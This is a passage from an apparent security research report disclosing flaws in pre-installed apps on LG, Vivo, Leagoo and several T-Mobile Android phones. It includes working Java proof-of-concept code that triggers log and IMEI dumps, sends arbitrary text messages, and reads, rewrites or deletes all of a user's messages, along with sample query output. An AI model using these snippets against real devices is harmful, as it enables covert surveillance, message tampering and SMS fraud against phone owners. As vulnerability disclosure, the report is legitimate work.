LG G6 - lge/lucye_nao_us_nr/lucye:7.0/NRD90U/17355125006e7:user/release-keys 
LG Q6 - lge/mhn_lao_com_nr/mhn:7.1.1/NMF26X/173421645aa48:user/release-keys 
28 https://source.android.com/setup/contribute/read-bug-reports 
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | PI:EMAIL 
The pre-installed com.lge.mlt app (versionCode=60000002, versionName=6.0.2) will dump an 
SQLite database to external storage containing a large amount of data including snippets of the logcat log 
and kernel log when it receives a broadcast intent with a specific action string that can be sent by any app 
on the device. The file that the app created on our device was 3.8 MB. The com.lge.mlt app has a broadcast 
receiver named com.lge.mlt.hiddenmenu.MptHiddenMenuReceiver. This receiver statically registers to 
receive broadcast intents that have an action string of com.lge.mlt.copy.hiddendatabase. Below is a 
snippet of the AndroidManifest.xml file of the com.lge.mlt app. 
When the MptHiddenMenuReceiver broadcast receiver receives a broadcast intent with an action string of 
com.lge.mlt.copy.hiddendatabase, it will copy a database with a path of /mpt/LDB_MainData.db to 
a path of /sdcard/ldb/_data.ez. In addition, on the LG G6 device, a file named a file named 
/mpt/serial is copied to a path of /sdcard/ldb/_index.ez and the file contains the International 
Mobile Equipment Identity (IMEI) of the device. This app appears to store crash logs and other diagnostic 
data. The End-User License Agreement (EULA) for the com.lge.mlt app says that the data may contain 
“application use history, IMEI, country, language, serial number, model, screen resolution, OS 
information, reception strength, network location information, and service and connection status.” Any 
app on the device that has been granted the READ_EXTERNAL_STORAGE permission can cause the 
com.lge.mlt app to write this database to the SD card and then mine it for personal data. In the 
_data.ez file, the table named t320 contains log entries from the kernel log and the logcat log. 
5.5 Vivo V7 – Dumping the Logcat Logs to External Storage 
The Vivo V7 device contains an app with a package name of com.vivo.bsptest (versionCode=1, 
versionName=1.0). This app will initiate the writing of the logcat log and kernel log to external storage 
with a default path of /sdcard/bbklog once it receives an intent that can be sent by any app on the device. 
The writing of the logs is not totally transparent to the user. Once a third-party app sends an intent to the 
com.vivo.bsptest app, a sticky notification appears in the status bar that “Log Collection – Logs are 
running.” The user can click the notification and cancel the collection of logs. The source code below will 
start the com.vivo.bsptest.BSPTestActivity activity app component (which activates the logging) with 
a flag which will hide it from the recent apps, wait 0.5 seconds, and then returns to the main launcher screen.  
Intent i = new Intent(); 
i.setClassName("com.vivo.bsptest", "com.vivo.bsptest.BSPTestActivity"); 
i.setFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS); 
startActivity(i); 
try { 
    Thread.sleep(500); 
} catch (InterruptedException e) { 
    e.printStackTrace(); 
} 
Intent i2 = new Intent("android.intent.action.MAIN"); 
i2.addCategory(Intent.CATEGORY_HOME); 
startActivity(i2); 
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | PI:EMAIL 
The Vivo V7 device can also be made to write the coordinates of screen presses to the logcat log as detailed 
in Section 9.1. 
6. Exposing Telephony Data and Capabilities 
We discovered that the Leagoo Z5C device allows any app co-located on the device to send arbitrary text 
messages. In addition, it allows any app on the device to obtain the most recent text message in each 
conversation via an exported content provider. We found that three devices sold by T-Mobile contained a 
Rich Communication Services (RCS) app that allows the sending of arbitrary text messages, allows the 
user’s text messages to be read and modified, and provides the phone numbers of the user’s contacts. This 
RCS app has also been refactored with a second package name that has essentially the same behavior.  
6.1 Leagoo Z5C – Custom com.android.messaging App 
We examined a Leagoo Z5C Android device, and we noticed some additional behavior that is not present  
in Google’s version of the com.android.messaging app. The Leagoo Z5C had a build fingerprint of  
sp7731c_1h10_32v4_bird:6.0/MRA58K/android.20170629.214736:user/release-keys. 
6.1.1 Leagoo Z5C – Sending Arbitrary Text Messages 
Any app on the device can send an intent to an exported broadcast receiver application component that will 
result in the sending of a text message where the phone number and body of the text message is controlled 
by the attacker. This can be accomplished by a zero-permission third-party app. The 
com.android.messaging 
app 
(versionCode=1000110, 
versionName=1.0.001, 
(android.20170630.092853-0)) 
contains 
an 
exported 
broadcast 
receiver 
named 
com.android.messaging.trackersender.TrackerSender, 
and 
its 
declaration 
in 
the 
AndroidManifest.xml file is provided below. The TrackerSender component is explicitly exported. 
The 
TrackerSender 
component 
registers 
for 
the 
com.sprd.mms.transaction.TrackerSender.SEND_SMS_ACTION action. When this component receives 
an intent with a specific action and has the appropriate data embedded in an intent, it will extract the data 
from the intent and send a text message using the android.telephony.SmsManager API. Below is the 
source code to make the TrackerSender component send a text message. 
Intent i = new Intent(); 
i.setAction("com.sprd.mms.transaction.TrackerSender.SEND_SMS_ACTION"); 
i.putExtra("message_body", "Huba"); 
i.putExtra("message_recipient", "+1703555555"); 
i.putExtra("message_falg_retry", true); 
i.putExtra("message_phone_id", 1); 
i.putExtra("message_token", (long) 1234); 
sendBroadcast(i); 
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | PI:EMAIL 
6.1.2 Leagoo Z5C – Obtaining the Most Recent Text Message from each Conversation 
Due to an exported broadcast receiver, a zero-permission third-party app can query the most recent text 
message from each conversation. That is, for each phone number where the user has either texted or received 
a text from, a zero-permission third party app can obtain the body of the text message, phone number, name 
of the contact (if it exists), and a timestamp. The com.android.messaging app (versionCode=1000110, 
versionName=1.0.001, (android.20170630.092853-0)) contains an exported content provider with a 
name of com.android.messaging.datamodel.MessagingContentProvider. Below is the content 
provider being declared in the com.android.messaging app’s AndroidManifest.xml file. 
As the querying of the content provider can be performed silently in the background, it can be continuously 
monitored to check to see if the current message in each conversation has changed and record any new 
messages. To query the most recent text message for each conversation, the app simply needs to query a 
content 
provider 
in 
the 
standard 
way 
where 
the 
authority 
string 
is 
com.android.messaging.datamodel.MessagingContentProvider/conversations. Below is the 
output of querying this content provider. The text messages that are sent by the device owner are the ones 
where the snippet_sender_display_destination field is empty.  
Row: 0 _id=2, name=(703) 555-0001, current_self_id=1, archive_status=0, read=1, 
icon=messaging://avatar/d?i=%2B17035550001, participant_contact_id=-2, 
participant_lookup_key=NULL, participant_normalized_destination=+17035550001, 
sort_timestamp=1526866037215, show_draft=0, draft_snippet_text=, draft_preview_uri=, 
draft_subject_text=, draft_preview_content_type=, preview_uri=NULL, preview_content_type=NULL, 
participant_count=1, notification_enabled=1, notification_sound_uri=NULL, 
notification_vibration=1, include_email_addr=0, message_status=100, raw_status=0, 
message_id=12, snippet_sender_first_name=NULL, snippet_sender_display_destination=(703) 555-
0001, snippet_text=Here is a text message, subject_text=NULL 
Row: 1 _id=3, name=(703) 555-0002, current_self_id=1, archive_status=0, read=1, 
icon=messaging://avatar/d?i=%2B17035550002, participant_contact_id=-2, 
participant_lookup_key=NULL, participant_normalized_destination=+17035550002, 
sort_timestamp=1526863999559, show_draft=0, draft_snippet_text=, draft_preview_uri=, 
draft_subject_text=, draft_preview_content_type=, preview_uri=NULL, preview_content_type=NULL, 
participant_count=1, notification_enabled=1, notification_sound_uri=NULL, 
notification_vibration=1, include_email_addr=0, message_status=1, raw_status=0, message_id=8, 
snippet_sender_first_name=Mike, snippet_sender_display_destination=, snippet_text=Test. Holla 
back, subject_text=NULL 
Row: 2 _id=1, name=Random Guy, current_self_id=1, archive_status=0, read=1, 
icon=messaging://avatar/l?n=Random%20Guy&i=1516r11-4B29432F4541355159, 
participant_contact_id=11, participant_lookup_key=1516r11-4B29432F4541355159, 
participant_normalized_destination=+17035550003, sort_timestamp=1526863649747, show_draft=0, 
draft_snippet_text=, draft_preview_uri=, draft_subject_text=, draft_preview_content_type=, 
preview_uri=NULL, preview_content_type=NULL, participant_count=1, notification_enabled=1, 
notification_sound_uri=NULL, notification_vibration=1, include_email_addr=0, message_status=1, 
raw_status=0, message_id=5, snippet_sender_first_name=Mike, 
snippet_sender_display_destination=, snippet_text=Here is a longer message. One more, 
subject_text=NULL 
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | PI:EMAIL 
6.2 Insecure RCS App on T-Mobile Devices 
We discovered an insecure pre-installed app that handles RCS with a package name of 
com.rcs.gsma.na.sdk (or a refactored version of the app) on three devices. There was a refactored version 
of the same app with almost the same functionality with a different package name 
(com.suntek.mway.rcs.app.service). We are unsure if this app has other refactored instances with 
additional package names. This app allows any app co-located on the device to read, delete, insert, and 
modify the user’s text messages, send arbitrary text messages, and obtain the phone numbers of the user’s 
contacts. All of these capabilities are done without the required permissions since the 
com.rcs.gsma.na.sdk app externally exposes them and does not set permissions requirements to access 
them. All of the devices we confirmed that contain this app were sold as T-Mobile devices: Coolpad Defiant, 
T-Mobile Revvl Plus, and ZTE Zmax Pro. We will explain the vulnerabilities on the T-Mobile Revvl Plus 
although the source code to exploit the vulnerabilities on the other two devices are almost exactly the same 
except for a different package name and component names due to refactoring. 
The T-Mobile Revvl Plus contains a pre-installed app with a package name of com.rcs.gsma.na.sdk 
(versionCode=1, versionName=RCS_SDK_20170804_01). This app executes as the system user (a 
privileged user) and cannot be disabled by the end-user. This application appears to handle RCS on the 
device. This application has 7 content providers that are exported and not protected by a permission, which 
makes them accessible to any app co-located on the device. Content provider application components are 
not exported by default, but the developers of this app explicitly exported them. A content provider acts as 
a repository for structured data and supports the standard SQL operations. Some of these content providers 
in the com.rcs.gsma.na.sdk app act as a wrapper where they internally access and operate on a different 
content provider. A content provider is accessed using an authority string. There is a content provider with 
a class name of com.rcs.gsma.na.provider.message.MessageProvider with an authority string of 
com.rcs.gsma.na.provider.message. When the com.rcs.gsma.na.provider.message authority is 
queried, it will query the sms authority (e.g., content://sms) and return the user’s sent and received text 
messages. Each text message entry includes a timestamp, phone number, message body, flag for whether 
the user has seen the message or not, etc. The source code below will return a string containing all of the 
user’s sent and received text messages. An example output of this method is provided in Appendix D. 
Uri aUri = Uri.parse("content://com.rcs.gsma.na.provider.message"); 
ContentResolver cr = getContentResolver(); 
Cursor cursor = cr.query(aUri, null, null, null, null); 
String allData = ""; 
String temp = ""; 
if (cursor == null || cursor.getCount() == 0) 
    return null; 
cursor.moveToFirst(); 
do { 
    int columnCount = cursor.getColumnCount(); 
    for(int id=0; id < cursor.getColumnCount(); id++) { 
        int type = cursor.getType(id); 
        if (type == 4) 
            continue; 
        temp = " " + cursor.getColumnName(id) + ":" + cursor.getString(id); 
        allData += temp; 
        Log.d("Key-Value pair", temp); 
    } 
    allData += "\n"; 
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | PI:EMAIL 
} while(cursor.moveToNext()); 
return allData; 
The source code below will change the body of all the user’s sent and received text messages to the word 
“goodbye”. The content of individual messages can be modified by adding a where clause and selection 
arguments for a specific message id.   
ContentResolver cr = getContentResolver(); 
ContentValues cv = new ContentValues(); 
cv.put("body","goodbye"); 
cr.update(Uri.parse("content://com.rcs.gsma.na.provider.message"), cv, null, null); 
The source code below will delete all of the user’s text messages. 
ContentResolver cr = getContentResolver(); 
cr.delete(Uri.parse("content://com.rcs.gsma.na.provider.message"), null, null); 
The phone numbers of the user’s contacts can be obtained from the com.rcs.gsma.na.sdk app. This app 
has 
a 
content 
provider 
application 
component 
with 
a 
class 
name 
of 
com.rcs.gsma.na.provider.capability.CapabilityProvider 
with 
an 
authority 
string 
of 
com.rcs.gsma.na.provider.capability. The CapabilityProvider component acts as a wrapper to 
the content://com.android.contacts Uniform Resource Interface (URI). The output from querying the 
CapabilityProvider content provider is provided in Appendix E and is queried in the same way as 
querying for the user’s text messages (provided above). 
In the com.rcs.gsma.na.sdk app, there is a broadcast receiver application component with a fully-
qualified class name of com.rcs.gsma.na.test.TestReceiver. This component is explicitly exported 
and allows a user to send a text message where the phone number and message can be chosen by the sender. 
This can be abused to send text messages to premium numbers or be used to send a distasteful message to 
all the user’s contacts. This can be accomplished by first using the  CapabilityProvider component and 
to obtain the phone number’s of the user’s contacts and then sending them a text message. 
Intent i = new Intent("com.rcs.gsma.na.sdk.TestReceiver"); 
i.setClassName("com.rcs.gsma.na.sdk", "com.rcs.gsma.na.test.TestReceiver"); 
i.putExtra("type", 110); 
i.putExtra("number", "7035557777"); 
i.putExtra("isLarge", false); 
i.putExtra("value", "help?!?!?"); 